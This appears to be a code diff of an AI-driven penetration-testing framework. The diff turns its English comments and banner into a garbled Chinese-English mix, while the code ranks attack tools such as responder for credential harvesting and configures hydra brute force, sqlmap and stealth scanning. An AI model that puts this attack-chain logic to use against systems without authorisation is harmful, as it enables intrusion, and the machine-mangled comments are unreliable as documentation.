@@ -154,40 +154,40 @@ class ModernVisualEngine:
         'BURGUNDY': '\033[38;5;52m',
         'SCARLET': '\033[38;5;197m',
         'RUBY': '\033[38;5;161m',
-    # Unified theme primary/secondary (used going forward instead of legacy blue/green accents)
-    'PRIMARY_BORDER': '\033[38;5;160m',  # CRIMSON
-    'ACCENT_LINE': '\033[38;5;196m',      # HACKER_RED
-    'ACCENT_GRADIENT': '\033[38;5;124m',  # BLOOD_RED (for subtle alternation)
-        # Highlighting colors
-        'HIGHLIGHT_RED': '\033[48;5;196m\033[38;5;15m',  # Red background, white text
-        'HIGHLIGHT_YELLOW': '\033[48;5;226m\033[38;5;16m',  # Yellow background, black text
-        'HIGHLIGHT_GREEN': '\033[48;5;46m\033[38;5;16m',  # Green background, black text
-        'HIGHLIGHT_BLUE': '\033[48;5;51m\033[38;5;16m',  # Blue background, black text
-        'HIGHLIGHT_PURPLE': '\033[48;5;129m\033[38;5;15m',  # Purple background, white text
-        # Status colors with reddish tones
-        'SUCCESS': '\033[38;5;46m',  # Bright green
-        'WARNING': '\033[38;5;208m',  # Orange
-        'ERROR': '\033[38;5;196m',  # Bright red
-        'CRITICAL': '\033[48;5;196m\033[38;5;15m\033[1m',  # Red background, white bold text
-        'INFO': '\033[38;5;51m',  # Cyan
-        'DEBUG': '\033[38;5;240m',  # Gray
-        # Vulnerability severity colors
-        'VULN_CRITICAL': '\033[48;5;124m\033[38;5;15m\033[1m',  # Dark red background
-        'VULN_HIGH': '\033[38;5;196m\033[1m',  # Bright red bold
-        'VULN_MEDIUM': '\033[38;5;208m\033[1m',  # Orange bold
-        'VULN_LOW': '\033[38;5;226m',  # Yellow
-        'VULN_INFO': '\033[38;5;51m',  # Cyan
-        # Tool status colors
-        'TOOL_RUNNING': '\033[38;5;46m\033[5m',  # Blinking green
-        'TOOL_SUCCESS': '\033[38;5;46m\033[1m',  # Bold green
-        'TOOL_FAILED': '\033[38;5;196m\033[1m',  # Bold red
-        'TOOL_TIMEOUT': '\033[38;5;208m\033[1m',  # Bold orange
-        'TOOL_RECOVERY': '\033[38;5;129m\033[1m',  # Bold purple
-        # Progress and animation colors
-        'PROGRESS_BAR': '\033[38;5;46m',  # Green
-        'PROGRESS_EMPTY': '\033[38;5;240m',  # Gray
-        'SPINNER': '\033[38;5;51m',  # Cyan
-        'PULSE': '\033[38;5;196m\033[5m'  # Blinking red
+    # Unified theme primary/secondary (used going forward instead 的 legacy blue/green accents)
+    'PRIMARY_BORDER': '\033[38;5;160m',  # 说明：CRIMSON
+    'ACCENT_LINE': '\033[38;5;196m',      # 说明：HACKER_RED
+    'ACCENT_GRADIENT': '\033[38;5;124m',  # BLOOD_RED (用于 subtle alternation)
+        # 说明：Highlighting colors
+        'HIGHLIGHT_RED': '\033[48;5;196m\033[38;5;15m',  # 说明：Red background, white text
+        'HIGHLIGHT_YELLOW': '\033[48;5;226m\033[38;5;16m',  # 说明：Yellow background, black text
+        'HIGHLIGHT_GREEN': '\033[48;5;46m\033[38;5;16m',  # 说明：Green background, black text
+        'HIGHLIGHT_BLUE': '\033[48;5;51m\033[38;5;16m',  # 说明：Blue background, black text
+        'HIGHLIGHT_PURPLE': '\033[48;5;129m\033[38;5;15m',  # 说明：Purple background, white text
+        # 状态 colors 使用 reddish tones
+        'SUCCESS': '\033[38;5;46m',  # 说明：Bright green
+        'WARNING': '\033[38;5;208m',  # 说明：Orange
+        'ERROR': '\033[38;5;196m',  # 说明：Bright red
+        'CRITICAL': '\033[48;5;196m\033[38;5;15m\033[1m',  # 说明：Red background, white bold text
+        'INFO': '\033[38;5;51m',  # 说明：Cyan
+        'DEBUG': '\033[38;5;240m',  # 说明：Gray
+        # 漏洞 severity colors
+        'VULN_CRITICAL': '\033[48;5;124m\033[38;5;15m\033[1m',  # 说明：Dark red background
+        'VULN_HIGH': '\033[38;5;196m\033[1m',  # 说明：Bright red bold
+        'VULN_MEDIUM': '\033[38;5;208m\033[1m',  # 说明：Orange bold
+        'VULN_LOW': '\033[38;5;226m',  # 说明：Yellow
+        'VULN_INFO': '\033[38;5;51m',  # 说明：Cyan
+        # 工具 状态 colors
+        'TOOL_RUNNING': '\033[38;5;46m\033[5m',  # 说明：Blinking green
+        'TOOL_SUCCESS': '\033[38;5;46m\033[1m',  # 说明：Bold green
+        'TOOL_FAILED': '\033[38;5;196m\033[1m',  # 说明：Bold red
+        'TOOL_TIMEOUT': '\033[38;5;208m\033[1m',  # 说明：Bold orange
+        'TOOL_RECOVERY': '\033[38;5;129m\033[1m',  # 说明：Bold purple
+        # Progress 与 animation colors
+        'PROGRESS_BAR': '\033[38;5;46m',  # 说明：Green
+        'PROGRESS_EMPTY': '\033[38;5;240m',  # 说明：Gray
+        'SPINNER': '\033[38;5;51m',  # 说明：Cyan
+        'PULSE': '\033[38;5;196m\033[5m'  # 说明：Blinking red
     }
 
     # 动画样式字典（用于进度组件）
@@ -218,14 +218,14 @@ class ModernVisualEngine:
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
 {RESET}
 {border_color}┌─────────────────────────────────────────────────────────────────────┐
-│  {ModernVisualEngine.COLORS['BRIGHT_WHITE']} HexStrike AI - Blood-Red Offensive Intelligence Core{border_color}        │
-│  {accent} AI-Automated Recon | Exploitation | Analysis Pipeline{border_color}          │
-│  {gradient} Bug Bounty | CTF | Red Team | Zero-Day Research{border_color}              │
+│  {ModernVisualEngine.COLORS['BRIGHT_WHITE']} HexStrike AI - 红队攻防智能核心{border_color}        │
+│  {accent} AI 自动化侦察 | 利用 | 分析流水线{border_color}          │
+│  {gradient} 漏洞赏金 | CTF | 红队 | 0day 研究{border_color}              │
 └─────────────────────────────────────────────────────────────────────┘{RESET}
 
-{ModernVisualEngine.COLORS['TERMINAL_GRAY']}[INFO] Server starting on {API_HOST}:{API_PORT}
-[INFO] 150+ integrated modules | Adaptive AI decision engine active
-[INFO] Blood-red theme engaged – unified offensive operations UI{RESET}
+{ModernVisualEngine.COLORS['TERMINAL_GRAY']}[信息] 服务启动于 {API_HOST}:{API_PORT}
+[信息] 150+ 集成模块 | 自适应 AI 决策引擎已启用
+[信息] 红色主题已启用 - 统一攻防操作界面{RESET}
 """
         return banner
 
@@ -275,7 +275,7 @@ class ModernVisualEngine:
             empty_char = '─'
             bar_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
             progress_color = ModernVisualEngine.COLORS['CYBER_ORANGE']
-        else:  # default
+        else:  # 默认
             filled_char = '█'
             empty_char = '░'
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
@@ -452,7 +452,7 @@ class ModernVisualEngine:
 
     @staticmethod
     def format_command_execution(command: str, status: str, duration: float = 0.0) -> str:
-        """Format command execution with enhanced styling"""
+        """Format 命令 execution 使用 增强 styling"""
         status_colors = {
             'STARTING': ModernVisualEngine.COLORS['INFO'],
             'RUNNING': ModernVisualEngine.COLORS['TOOL_RUNNING'],
@@ -467,11 +467,11 @@ class ModernVisualEngine:
         return f"{color} {command[:60]}{'...' if len(command) > 60 else ''} | {status.upper()}{duration_text}{ModernVisualEngine.COLORS['RESET']}"
 
 # ============================================================================
-# INTELLIGENT DECISION ENGINE (v6.0 ENHANCEMENT)
+# 智能 DECISION ENGINE (v6.0 ENHANCEMENT)
 # ============================================================================
 
 class TargetType(Enum):
-    """Enumeration of different target types for intelligent analysis"""
+    """Enumeration 的 different 目标 types 用于 智能 分析"""
     WEB_APPLICATION = "web_application"
     NETWORK_HOST = "network_host"
     API_ENDPOINT = "api_endpoint"
@@ -481,7 +481,7 @@ class TargetType(Enum):
     UNKNOWN = "unknown"
 
 class TechnologyStack(Enum):
-    """Common technology stacks for targeted testing"""
+    """常见 technology stacks 用于 targeted 测试"""
     APACHE = "apache"
     NGINX = "nginx"
     IIS = "iis"
@@ -500,7 +500,7 @@ class TechnologyStack(Enum):
 
 @dataclass
 class TargetProfile:
-    """Comprehensive target analysis profile for intelligent decision making"""
+    """综合 目标 分析 profile 用于 智能 decision making"""
     target: str
     target_type: TargetType = TargetType.UNKNOWN
     ip_addresses: List[str] = field(default_factory=list)
@@ -518,7 +518,7 @@ class TargetProfile:
     confidence_score: float = 0.0
 
     def to_dict(self) -> Dict[str, Any]:
-        """Convert TargetProfile to dictionary for JSON serialization"""
+        """转换 TargetProfile 到 dictionary 用于 JSON serialization"""
         return {
             "target": self.target,
             "target_type": self.target_type.value,
@@ -539,16 +539,16 @@ class TargetProfile:
 
 @dataclass
 class AttackStep:
-    """Individual step in an attack chain"""
+    """Individual step 在 an attack chain"""
     tool: str
     parameters: Dict[str, Any]
     expected_outcome: str
     success_probability: float
-    execution_time_estimate: int  # seconds
+    execution_time_estimate: int  # 说明：seconds
     dependencies: List[str] = field(default_factory=list)
 
 class AttackChain:
-    """Represents a sequence of attacks for maximum impact"""
+    """Represents a sequence 的 attacks 用于 maximum impact"""
     def __init__(self, target_profile: TargetProfile):
         self.target_profile = target_profile
         self.steps: List[AttackStep] = []
@@ -558,18 +558,18 @@ class AttackChain:
         self.risk_level: str = "unknown"
 
     def add_step(self, step: AttackStep):
-        """Add a step to the attack chain"""
+        """Add a step 到 the attack chain"""
         self.steps.append(step)
         self.required_tools.add(step.tool)
         self.estimated_time += step.execution_time_estimate
 
     def calculate_success_probability(self):
-        """Calculate overall success probability of the attack chain"""
+        """计算 overall 成功 probability 的 the attack chain"""
         if not self.steps:
             self.success_probability = 0.0
             return
 
-        # Use compound probability for sequential steps
+        # Use compound probability 用于 sequential steps
         prob = 1.0
         for step in self.steps:
             prob *= step.success_probability
@@ -577,7 +577,7 @@ class AttackChain:
         self.success_probability = prob
 
     def to_dict(self) -> Dict[str, Any]:
-        """Convert AttackChain to dictionary"""
+        """转换 AttackChain 到 dictionary"""
         return {
             "target": self.target_profile.target,
             "steps": [
@@ -598,16 +598,16 @@ class AttackChain:
         }
 
 class IntelligentDecisionEngine:
-    """AI-powered tool selection and parameter optimization engine"""
+    """AI-powered 工具 selection 与 参数 optimization engine"""
 
     def __init__(self):
         self.tool_effectiveness = self._initialize_tool_effectiveness()
         self.technology_signatures = self._initialize_technology_signatures()
         self.attack_patterns = self._initialize_attack_patterns()
-        self._use_advanced_optimizer = True  # Enable advanced optimization by default
+        self._use_advanced_optimizer = True  # 启用 高级 optimization 由 默认
 
     def _initialize_tool_effectiveness(self) -> Dict[str, Dict[str, float]]:
-        """Initialize tool effectiveness ratings for different target types"""
+        """初始化 工具 effectiveness ratings 用于 different 目标 types"""
         return {
             TargetType.WEB_APPLICATION.value: {
                 "nmap": 0.8,
@@ -619,7 +619,7 @@ class IntelligentDecisionEngine:
                 "feroxbuster": 0.85,
                 "katana": 0.88,
                 "httpx": 0.85,
-                "wpscan": 0.95,  # High for WordPress sites
+                "wpscan": 0.95,  # 高 用于 WordPress sites
                 "burpsuite": 0.9,
                 "dirsearch": 0.87,
                 "gau": 0.82,
@@ -628,24 +628,24 @@ class IntelligentDecisionEngine:
                 "paramspider": 0.85,
                 "x8": 0.88,
                 "jaeles": 0.92,
-                "dalfox": 0.93,  # High for XSS detection
-                "anew": 0.7,  # Utility tool
-                "qsreplace": 0.75,  # Utility tool
-                "uro": 0.7  # Utility tool
+                "dalfox": 0.93,  # 高 用于 XSS detection
+                "anew": 0.7,  # Utility 工具
+                "qsreplace": 0.75,  # Utility 工具
+                "uro": 0.7  # Utility 工具
             },
             TargetType.NETWORK_HOST.value: {
                 "nmap": 0.95,
-                "nmap-advanced": 0.97,  # Enhanced Nmap with NSE scripts
-                "masscan": 0.92,  # Enhanced with intelligent rate limiting
-                "rustscan": 0.9,  # Ultra-fast scanning
-                "autorecon": 0.95,  # Comprehensive automated recon
+                "nmap-advanced": 0.97,  # 增强 Nmap 使用 NSE scripts
+                "masscan": 0.92,  # 增强 使用 智能 rate limiting
+                "rustscan": 0.9,  # Ultra-fast 扫描
+                "autorecon": 0.95,  # 综合 automated recon
                 "enum4linux": 0.8,
-                "enum4linux-ng": 0.88,  # Enhanced version
+                "enum4linux-ng": 0.88,  # 增强 version
                 "smbmap": 0.85,
                 "rpcclient": 0.82,
                 "nbtscan": 0.75,
-                "arp-scan": 0.85,  # Great for network discovery
-                "responder": 0.88,  # Excellent for credential harvesting
+                "arp-scan": 0.85,  # Great 用于 网络 发现
+                "responder": 0.88,  # Excellent 用于 凭据 采集
                 "hydra": 0.8,
                 "netexec": 0.85,
                 "amass": 0.7
@@ -653,49 +653,49 @@ class IntelligentDecisionEngine:
             TargetType.API_ENDPOINT.value: {
                 "nuclei": 0.9,
                 "ffuf": 0.85,
-                "arjun": 0.95,  # Excellent for API parameter discovery
+                "arjun": 0.95,  # Excellent 用于 API 参数 发现
                 "paramspider": 0.88,
-                "httpx": 0.9,  # Great for API probing
-                "x8": 0.92,  # Excellent for hidden parameters
-                "katana": 0.85,  # Good for API endpoint discovery
+                "httpx": 0.9,  # Great 用于 API probing
+                "x8": 0.92,  # Excellent 用于 hidden 参数
+                "katana": 0.85,  # Good 用于 API 端点 发现
                 "jaeles": 0.88,
                 "postman": 0.8
             },
             TargetType.CLOUD_SERVICE.value: {
-                "prowler": 0.95,  # Excellent for AWS security assessment
-                "scout-suite": 0.92,  # Great for multi-cloud assessment
-                "cloudmapper": 0.88,  # Good for AWS network visualization
-                "pacu": 0.85,  # AWS exploitation framework
-                "trivy": 0.9,  # Excellent for container scanning
-                "clair": 0.85,  # Good for container vulnerability analysis
-                "kube-hunter": 0.9,  # Excellent for Kubernetes penetration testing
-                "kube-bench": 0.88,  # Great for CIS benchmarks
-                "docker-bench-security": 0.85,  # Good for Docker security
-                "falco": 0.87,  # Great for runtime monitoring
-                "checkov": 0.9,  # Excellent for IaC scanning
-                "terrascan": 0.88  # Great for IaC security
+                "prowler": 0.95,  # Excellent 用于 AWS 安全 assessment
+                "scout-suite": 0.92,  # Great 用于 multi-云 assessment
+                "cloudmapper": 0.88,  # Good 用于 AWS 网络 visualization
+                "pacu": 0.85,  # AWS exploitation 框架
+                "trivy": 0.9,  # Excellent 用于 容器 扫描
+                "clair": 0.85,  # Good 用于 容器 漏洞 分析
+                "kube-hunter": 0.9,  # Excellent 用于 Kubernetes penetration 测试
+                "kube-bench": 0.88,  # Great 用于 CIS benchmarks
+                "docker-bench-security": 0.85,  # Good 用于 Docker 安全
+                "falco": 0.87,  # Great 用于 runtime 监控
+                "checkov": 0.9,  # Excellent 用于 IaC 扫描
+                "terrascan": 0.88  # Great 用于 IaC 安全
             },
             TargetType.BINARY_FILE.value: {
-                "ghidra": 0.95,  # Excellent for comprehensive analysis
-                "radare2": 0.9,  # Great for reverse engineering
+                "ghidra": 0.95,  # Excellent 用于 综合 分析
+                "radare2": 0.9,  # Great 用于 逆向工程
                 "gdb": 0.85,
-                "gdb-peda": 0.92,  # Enhanced debugging
-                "angr": 0.88,  # Excellent for symbolic execution
-                "pwntools": 0.9,  # Great for exploit development
+                "gdb-peda": 0.92,  # 增强 debugging
+                "angr": 0.88,  # Excellent 用于 symbolic execution
+                "pwntools": 0.9,  # Great 用于 利用 development
                 "ropgadget": 0.85,
-                "ropper": 0.88,  # Enhanced gadget searching
-                "one-gadget": 0.82,  # Specific to libc
-                "libc-database": 0.8,  # Specific to libc identification
+                "ropper": 0.88,  # 增强 gadget searching
+                "one-gadget": 0.82,  # Specific 到 libc
+                "libc-database": 0.8,  # Specific 到 libc identification
                 "checksec": 0.75,
                 "strings": 0.7,
                 "objdump": 0.75,
                 "binwalk": 0.8,
-                "pwninit": 0.85  # Great for CTF setup
+                "pwninit": 0.85  # Great 用于 CTF 初始化
             }
         }
 
     def _initialize_technology_signatures(self) -> Dict[str, Dict[str, List[str]]]:
-        """Initialize technology detection signatures"""
+        """初始化 technology detection signatures"""
         return {
             "headers": {
                 TechnologyStack.APACHE.value: ["Apache", "apache"],
@@ -724,7 +724,7 @@ class IntelligentDecisionEngine:
         }
 
     def _initialize_attack_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
-        """Initialize common attack patterns for different scenarios"""
+        """初始化 常见 attack patterns 用于 different scenarios"""
         return {
             "web_reconnaissance": [
                 {"tool": "nmap", "priority": 1, "params": {"scan_type": "-sV -sC", "ports": "80,443,8080,8443"}},
@@ -837,61 +837,61 @@ class IntelligentDecisionEngine:
         }
 
     def analyze_target(self, target: str) -> TargetProfile:
-        """Analyze target and create comprehensive profile"""
+        """分析 目标 与 创建 综合 profile"""
         profile = TargetProfile(target=target)
 
-        # Determine target type
+        # 判断 目标 类型
         profile.target_type = self._determine_target_type(target)
 
-        # Basic network analysis
+        # 基础 网络 分析
         if profile.target_type in [TargetType.WEB_APPLICATION, TargetType.API_ENDPOINT]:
             profile.ip_addresses = self._resolve_domain(target)
 
-        # Technology detection (basic heuristics)
+        # Technology detection (基础 heuristics)
         if profile.target_type == TargetType.WEB_APPLICATION:
             profile.technologies = self._detect_technologies(target)
             profile.cms_type = self._detect_cms(target)
 
-        # Calculate attack surface score
+        # 计算 attack surface 评分
         profile.attack_surface_score = self._calculate_attack_surface(profile)
 
-        # Determine risk level
+        # 判断 risk level
         profile.risk_level = self._determine_risk_level(profile)
 
-        # Set confidence score
+        # 设置 confidence 评分
         profile.confidence_score = self._calculate_confidence(profile)
 
         return profile
 
     def _determine_target_type(self, target: str) -> TargetType:
-        """Determine the type of target for appropriate tool selection"""
-        # URL patterns
+        """判断 the 类型 的 目标 用于 appropriate 工具 selection"""
+        # 说明：URL patterns
         if target.startswith(('http://', 'https://')):
             parsed = urllib.parse.urlparse(target)
             if '/api/' in parsed.path or parsed.path.endswith('/api'):
                 return TargetType.API_ENDPOINT
             return TargetType.WEB_APPLICATION
 
-        # IP address pattern
+        # 说明：IP address pattern
         if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
             return TargetType.NETWORK_HOST
 
-        # Domain name pattern
+        # 域名 name pattern
         if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
             return TargetType.WEB_APPLICATION
 
-        # File patterns
+        # 文件 patterns
         if target.endswith(('.exe', '.bin', '.elf', '.so', '.dll')):
             return TargetType.BINARY_FILE
 
-        # Cloud service patterns
+        # 云 service patterns
         if any(cloud in target.lower() for cloud in ['amazonaws.com', 'azure', 'googleapis.com']):
             return TargetType.CLOUD_SERVICE
 
         return TargetType.UNKNOWN
 
     def _resolve_domain(self, target: str) -> List[str]:
-        """Resolve domain to IP addresses"""
+        """Resolve 域名 到 IP addresses"""
         try:
             if target.startswith(('http://', 'https://')):
                 hostname = urllib.parse.urlparse(target).hostname
@@ -906,13 +906,13 @@ class IntelligentDecisionEngine:
         return []
 
     def _detect_technologies(self, target: str) -> List[TechnologyStack]:
-        """Detect technologies using basic heuristics"""
+        """Detect technologies using 基础 heuristics"""
         technologies = []
 
-        # This is a simplified version - in practice, you'd make HTTP requests
-        # and analyze headers, content, etc.
+        # This is a simplified version - 在 practice, you'd make HTTP 请求
+        # 与 分析 请求头, content, etc.
 
-        # For now, return some common technologies based on target patterns
+        # 用于 now, return some 常见 technologies based 在 目标 patterns
         if 'wordpress' in target.lower() or 'wp-' in target.lower():
             technologies.append(TechnologyStack.WORDPRESS)
 
@@ -925,7 +925,7 @@ class IntelligentDecisionEngine:
         return technologies if technologies else [TechnologyStack.UNKNOWN]
 
     def _detect_cms(self, target: str) -> Optional[str]:
-        """Detect CMS type"""
+        """Detect CMS 类型"""
         target_lower = target.lower()
 
         if 'wordpress' in target_lower or 'wp-' in target_lower:
@@ -938,10 +938,10 @@ class IntelligentDecisionEngine:
         return None
 
     def _calculate_attack_surface(self, profile: TargetProfile) -> float:
-        """Calculate attack surface score based on profile"""
+        """计算 attack surface 评分 based 在 profile"""
         score = 0.0
 
-        # Base score by target type
+        # Base 评分 由 目标 类型
         type_scores = {
             TargetType.WEB_APPLICATION: 7.0,
             TargetType.API_ENDPOINT: 6.0,
@@ -952,23 +952,23 @@ class IntelligentDecisionEngine:
 
         score += type_scores.get(profile.target_type, 3.0)
 
-        # Add points for technologies
+        # Add points 用于 technologies
         score += len(profile.technologies) * 0.5
 
-        # Add points for open ports
+        # Add points 用于 open ports
         score += len(profile.open_ports) * 0.3
 
-        # Add points for subdomains
+        # Add points 用于 subdomains
         score += len(profile.subdomains) * 0.2
 
-        # CMS adds attack surface
+        # 说明：CMS adds attack surface
         if profile.cms_type:
             score += 1.5
 
-        return min(score, 10.0)  # Cap at 10.0
+        return min(score, 10.0)  # 说明：Cap at 10.0
 
     def _determine_risk_level(self, profile: TargetProfile) -> str:
-        """Determine risk level based on attack surface"""
+        """判断 risk level based 在 attack surface"""
         if profile.attack_surface_score >= 8.0:
             return "critical"
         elif profile.attack_surface_score >= 6.0:
@@ -981,10 +981,10 @@ class IntelligentDecisionEngine:
             return "minimal"
 
     def _calculate_confidence(self, profile: TargetProfile) -> float:
-        """Calculate confidence score in the analysis"""
-        confidence = 0.5  # Base confidence
+        """计算 confidence 评分 在 the 分析"""
+        confidence = 0.5  # 说明：Base confidence
 
-        # Increase confidence based on available data
+        # Increase confidence based 在 available data
         if profile.ip_addresses:
             confidence += 0.1
         if profile.technologies and profile.technologies[0] != TechnologyStack.UNKNOWN:
@@ -997,29 +997,29 @@ class IntelligentDecisionEngine:
         return min(confidence, 1.0)
 
     def select_optimal_tools(self, profile: TargetProfile, objective: str = "comprehensive") -> List[str]:
-        """Select optimal tools based on target profile and objective"""
+        """选择 optimal 工具 based 在 目标 profile 与 objective"""
         target_type = profile.target_type.value
         effectiveness_map = self.tool_effectiveness.get(target_type, {})
 
-        # Get base tools for target type
+        # 获取 base 工具 用于 目标 类型
         base_tools = list(effectiveness_map.keys())
 
-        # Apply objective-based filtering
+        # 说明：Apply objective-based filtering
         if objective == "quick":
-            # Select top 3 most effective tools
+            # 选择 top 3 most effective 工具
             sorted_tools = sorted(base_tools, key=lambda t: effectiveness_map.get(t, 0), reverse=True)
             selected_tools = sorted_tools[:3]
         elif objective == "comprehensive":
-            # Select all tools with effectiveness > 0.7
+            # 选择 全部 工具 使用 effectiveness > 0.7
             selected_tools = [tool for tool in base_tools if effectiveness_map.get(tool, 0) > 0.7]
         elif objective == "stealth":
-            # Select passive tools with lower detection probability
+            # 选择 passive 工具 使用 lower detection probability
             stealth_tools = ["amass", "subfinder", "httpx", "nuclei"]
             selected_tools = [tool for tool in base_tools if tool in stealth_tools]
         else:
             selected_tools = base_tools
 
-        # Add technology-specific tools
+        # Add technology-specific 工具
         for tech in profile.technologies:
             if tech == TechnologyStack.WORDPRESS and "wpscan" not in selected_tools:
                 selected_tools.append("wpscan")
@@ -1029,18 +1029,18 @@ class IntelligentDecisionEngine:
         return selected_tools
 
     def optimize_parameters(self, tool: str, profile: TargetProfile, context: Dict[str, Any] = None) -> Dict[str, Any]:
-        """Enhanced parameter optimization with advanced intelligence"""
+        """增强 参数 optimization 使用 高级 intelligence"""
         if context is None:
             context = {}
 
-        # Use advanced parameter optimizer if available
+        # Use 高级 参数 optimizer 如果 available
         if hasattr(self, '_use_advanced_optimizer') and self._use_advanced_optimizer:
             return parameter_optimizer.optimize_parameters_advanced(tool, profile, context)
 
-        # Fallback to legacy optimization for compatibility
+        # 降级 到 legacy optimization 用于 compatibility
         optimized_params = {}
 
-        # Tool-specific parameter optimization
+        # Tool-specific 参数 optimization
         if tool == "nmap":
             optimized_params = self._optimize_nmap_params(profile, context)
         elif tool == "gobuster":
@@ -1082,21 +1082,21 @@ class IntelligentDecisionEngine:
         elif tool == "checkov":
             optimized_params = self._optimize_checkov_params(profile, context)
         else:
-            # Use advanced optimizer for unknown tools
+            # Use 高级 optimizer 用于 unknown 工具
             return parameter_optimizer.optimize_parameters_advanced(tool, profile, context)
 
         return optimized_params
 
     def enable_advanced_optimization(self):
-        """Enable advanced parameter optimization"""
+        """启用 高级 参数 optimization"""
         self._use_advanced_optimizer = True
 
     def disable_advanced_optimization(self):
-        """Disable advanced parameter optimization (use legacy)"""
+        """禁用 高级 参数 optimization (use legacy)"""
         self._use_advanced_optimizer = False
 
     def _optimize_nmap_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Nmap parameters"""
+        """Optimize Nmap 参数"""
         params = {"target": profile.target}
 
         if profile.target_type == TargetType.WEB_APPLICATION:
@@ -1106,7 +1106,7 @@ class IntelligentDecisionEngine:
             params["scan_type"] = "-sS -O"
             params["additional_args"] = "--top-ports 1000"
 
-        # Adjust timing based on stealth requirements
+        # Adjust timing based 在 stealth requirements
         if context.get("stealth", False):
             params["additional_args"] = params.get("additional_args", "") + " -T2"
         else:
@@ -1115,10 +1115,10 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_gobuster_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Gobuster parameters"""
+        """Optimize Gobuster 参数"""
         params = {"url": profile.target, "mode": "dir"}
 
-        # Select wordlist based on detected technologies
+        # 选择 wordlist based 在 detected technologies
         if TechnologyStack.PHP in profile.technologies:
             params["additional_args"] = "-x php,html,txt,xml"
         elif TechnologyStack.DOTNET in profile.technologies:
@@ -1128,7 +1128,7 @@ class IntelligentDecisionEngine:
         else:
             params["additional_args"] = "-x html,php,txt,js"
 
-        # Adjust threads based on target type
+        # Adjust threads based 在 目标 类型
         if context.get("aggressive", False):
             params["additional_args"] += " -t 50"
         else:
@@ -1137,16 +1137,16 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_nuclei_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Nuclei parameters"""
+        """Optimize Nuclei 参数"""
         params = {"target": profile.target}
 
-        # Set severity based on context
+        # 设置 severity based 在 context
         if context.get("quick", False):
             params["severity"] = "critical,high"
         else:
             params["severity"] = "critical,high,medium"
 
-        # Add technology-specific tags
+        # 说明：Add technology-specific tags
         tags = []
         for tech in profile.technologies:
             if tech == TechnologyStack.WORDPRESS:
@@ -1162,10 +1162,10 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_sqlmap_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize SQLMap parameters"""
+        """Optimize SQLMap 参数"""
         params = {"url": profile.target}
 
-        # Add database-specific options based on detected technologies
+        # Add database-specific options based 在 detected technologies
         if TechnologyStack.PHP in profile.technologies:
             params["additional_args"] = "--dbms=mysql --batch"
         elif TechnologyStack.DOTNET in profile.technologies:
@@ -1173,23 +1173,23 @@ class IntelligentDecisionEngine:
         else:
             params["additional_args"] = "--batch"
 
-        # Adjust aggressiveness
+        # 说明：Adjust aggressiveness
         if context.get("aggressive", False):
             params["additional_args"] += " --level=3 --risk=2"
 
         return params
 
     def _optimize_ffuf_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize FFuf parameters"""
+        """Optimize FFuf 参数"""
         params = {"url": profile.target}
 
-        # Set match codes based on target type
+        # 设置 match codes based 在 目标 类型
         if profile.target_type == TargetType.API_ENDPOINT:
             params["match_codes"] = "200,201,202,204,301,302,401,403"
         else:
             params["match_codes"] = "200,204,301,302,307,401,403"
 
-        # Adjust threads
+        # 说明：Adjust threads
         if context.get("stealth", False):
             params["additional_args"] = "-t 10 -p 1"
         else:
@@ -1198,10 +1198,10 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_hydra_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Hydra parameters"""
+        """Optimize Hydra 参数"""
         params = {"target": profile.target}
 
-        # Determine service based on open ports
+        # 判断 service based 在 open ports
         if 22 in profile.open_ports:
             params["service"] = "ssh"
         elif 21 in profile.open_ports:
@@ -1209,18 +1209,18 @@ class IntelligentDecisionEngine:
         elif 80 in profile.open_ports or 443 in profile.open_ports:
             params["service"] = "http-get"
         else:
-            params["service"] = "ssh"  # Default
+            params["service"] = "ssh"  # 默认
 
-        # Set conservative parameters to avoid lockouts
+        # 设置 conservative 参数 到 avoid lockouts
         params["additional_args"] = "-t 4 -w 30"
 
         return params
 
     def _optimize_rustscan_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Rustscan parameters"""
+        """Optimize Rustscan 参数"""
         params = {"target": profile.target}
 
-        # Adjust performance based on context
+        # Adjust performance based 在 context
         if context.get("stealth", False):
             params["ulimit"] = 1000
             params["batch_size"] = 500
@@ -1234,36 +1234,36 @@ class IntelligentDecisionEngine:
             params["batch_size"] = 4500
             params["timeout"] = 1500
 
-        # Enable scripts for comprehensive scans
+        # 启用 scripts 用于 综合 scans
         if context.get("objective", "normal") == "comprehensive":
             params["scripts"] = True
 
         return params
 
     def _optimize_masscan_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Masscan parameters"""
+        """Optimize Masscan 参数"""
         params = {"target": profile.target}
 
-        # Intelligent rate limiting based on target type
+        # 智能 rate limiting based 在 目标 类型
         if context.get("stealth", False):
             params["rate"] = 100
         elif context.get("aggressive", False):
             params["rate"] = 10000
         else:
-            # Default intelligent rate
+            # 默认 智能 rate
             params["rate"] = 1000
 
-        # Enable banners for service detection
+        # 启用 banners 用于 service detection
         if context.get("service_detection", True):
             params["banners"] = True
 
         return params
 
     def _optimize_nmap_advanced_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize advanced Nmap parameters"""
+        """Optimize 高级 Nmap 参数"""
         params = {"target": profile.target}
 
-        # Select scan type based on context
+        # 选择 扫描 类型 based 在 context
         if context.get("stealth", False):
             params["scan_type"] = "-sS"
             params["timing"] = "T2"
@@ -1278,7 +1278,7 @@ class IntelligentDecisionEngine:
